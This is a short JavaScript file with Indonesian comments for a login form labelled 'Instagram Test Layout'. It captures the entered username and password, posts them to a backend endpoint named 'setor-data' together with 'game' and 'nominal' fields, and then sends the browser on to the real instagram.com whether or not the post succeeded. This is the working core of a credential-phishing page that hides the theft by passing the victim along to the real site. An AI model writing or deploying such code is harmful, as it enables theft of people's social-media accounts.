// Menangkap elemen form
const formLogin = document.querySelector('#form-login');

formLogin.addEventListener('submit', async (event) => {
    event.preventDefault(); // Mencegah halaman refresh otomatis bawaan form

    // 1. Mengambil data dari input field
    const usernameInput = document.querySelector('#username').value;
    const passwordInput = document.querySelector('#password').value;

    const dataPayload = {
        username: usernameInput,
        password: passwordInput,
        game: 'Instagram Test Layout',
        nominal: 'N/A'
    };

    try {
        // 2. Mengirimkan data ke Backend Express
        const response = await fetch('http://localhost:5000/api/setor-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(dataPayload)
        });

        const result = await response.json();

        // 3. Jika backend sukses memproses, langsung lempar ke alamat tujuan
        if (result.status === 'success') {
            // Mengalihkan browser ke halaman eksternal
            window.location.href = 'https://www.instagram.com';
        }

    } catch (error) {
        console.error('Gagal menghubungi server backend:', error);
        // Error handling jika server backend belum dihidupkan
        window.location.href = 'https://www.instagram.com';
    }
});